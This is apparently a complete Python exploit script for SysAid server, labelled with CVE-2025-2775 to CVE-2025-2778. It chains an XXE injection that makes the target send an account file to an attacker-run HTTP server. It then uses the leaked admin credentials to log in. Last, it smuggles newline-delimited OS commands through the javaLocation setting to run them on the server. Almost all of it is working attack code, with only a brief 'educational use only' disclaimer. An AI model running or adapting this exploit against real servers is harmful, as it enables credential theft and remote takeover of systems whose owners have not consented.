import requests
import argparse
from http.server import BaseHTTPRequestHandler, HTTPServer
from threading import Thread
from time import sleep
import re
from colorama import init, Fore, Style

requests.packages.urllib3.disable_warnings()
init(autoreset=True)

# Banner
banner = fr"""
{Fore.CYAN}{Style.BRIGHT}
  _________               _____  .__    .______________________ ___________
 /   _____/__.__. ______ /  _  \ |__| __| _/\______   \_   ___ \\_   _____/
 \_____  <   |  |/  ___//  /_\  \|  |/ __ |  |       _/    \  \/ |    __)_ 
 /        \___  |\___ \/    |    \  / /_/ |  |    |   \     \____|        \ 
/_______  / ____/____  >____|__  /__\____ |  |____|_  /\______  /_______  /
        \/\/         \/        \/        \/         \/        \/        \/ 

{Fore.YELLOW}
    SysAid Pre-Auth RCE Exploit Chain
    Author   : {Fore.RED}0xgh057r3c0n{Fore.YELLOW}
    CVEs     : CVE-2025-2775 to CVE-2025-2778
    Timestamp: {Fore.GREEN}{current_time}
    {Fore.RED}For educational use only. Authorized testing only.
"""
print(banner)

# Argument Parsing
parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', required=True, help='Target URL, e.g: http://192.168.1.1:8080/')
parser.add_argument('-l', '--attacker', dest='attacker_server', required=True, help='Attacker IP, e.g: 192.168.1.20')
parser.add_argument('-c', '--command', dest='command', required=True, help='Command to execute, e.g: whoami')
args = parser.parse_args()

HTTPSERVER_PORT = 80
attacker_server = args.attacker_server
args.target = args.target.rstrip('/')
s = requests.Session()

# XXE Payload
xxePayload = f"""<?xml version="1.0"?>
<!DOCTYPE cdl [<!ENTITY % asd SYSTEM "http://{attacker_server}/e.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>"""

file_to_leak = r'C:\Program Files\SysAidServer\logs\InitAccount.cmd'
xxeDtd = f"""<!ENTITY % d SYSTEM "file:///{file_to_leak}">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://{attacker_server}/?e=%d;'>"> """

# Colored Logging
def log(msg, level='info'):
    color = {
        'info': Fore.CYAN,
        'good': Fore.GREEN,
        'warn': Fore.YELLOW,
        'fail': Fore.RED
    }.get(level, Fore.WHITE)
    print(f"{color}[*] {msg}")

# Stage Functions
def second_stage(u, p):
    log(f"Leaked credentials: {u}:{p}", "good")
    login(u, p)
    execute_command(args.command)

def login(u, p):
    res = s.post(f'{args.target}/Login.jsp', data={'userName': u, 'password': p}, allow_redirects=False)
    if res.status_code == 302:
        log("Successfully logged in", "good")
    else:
        log("Failed to login, response was:", "fail")
        print(res.text)
        exit(1)

def grab_csrf_token():
    res = s.get(f'{args.target}/API.jsp', headers={'Referer': f'{args.target}/Settings.jsp'}).text
    token_match = re.search(r'(X_TOKEN\S+)".*value="(\S+)"', res)
    token = f"{token_match.group(1)}={token_match.group(2)}"
    log("Extracted token", "info")
    return token

def execute_command(command):
    command = f'"%0a{command}%0a'
    csrf_token = grab_csrf_token()

    log("Poisoning with commands...", "info")
    _data = f'{csrf_token}&updateApi=false&updateApiSettings=true&javaLocation={command}'
    res = s.post(f'{args.target}/API.jsp', data=_data, headers={'Content-Type': 'application/x-www-form-urlencoded'})

    if res.status_code != 200:
        log(f"Failed to poison javaLocation, error: {res.status_code}", "fail")
        return

    _data = f'{csrf_token}&updateApi=true&updateApiSettings=false&javaLocation={command}'
    res = s.post(f'{args.target}/API.jsp', data=_data, headers={'Content-Type': 'application/x-www-form-urlencoded'})

    if res.status_code == 200:
        log("Commands executed successfully", "good")
        log("Done", "info")
        exit(0)
    else:
        log(f"Failed to execute command, error: {res.status_code}", "fail")

def stage1():
    sleep(1.5)
    requests.post(f'{args.target}/mdm/serverurl', data=xxePayload)

# Malicious HTTP Server
done = False
class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()

    def do_GET(self):
        self._set_response()
        self.wfile.write(xxeDtd.encode('utf-8'))

    def log_message(self, format, *args):
        return

    def send_error(self, code, message=None, explain=None):
        global done
        if done:
            return
        log("Leaking creds...", "info")
        try:
            admin_username, admin_password = message.split(' ')[-4:-2]
            if not admin_username or not admin_password:
                raise Exception("Empty credentials")
            admin_username = admin_username.replace('"', '')
            admin_password = admin_password.replace('"', '')
            done = True
            second_stage(admin_username, admin_password)
        except Exception as e:
            log("Failed to extract credentials. Dumping to exfil.txt", "fail")
            open('exfil.txt', 'w').write(message)
            exit(1)

# Start HTTP Server and Begin Exploit
server_address = ('', HTTPSERVER_PORT)
httpd = HTTPServer(server_address, S)

try:
    t = Thread(target=stage1)
    t.daemon = True
    t.start()
    log(f"Starting HTTP server on port {HTTPSERVER_PORT}", "info")
    httpd.serve_forever()
except KeyboardInterrupt:
    pass
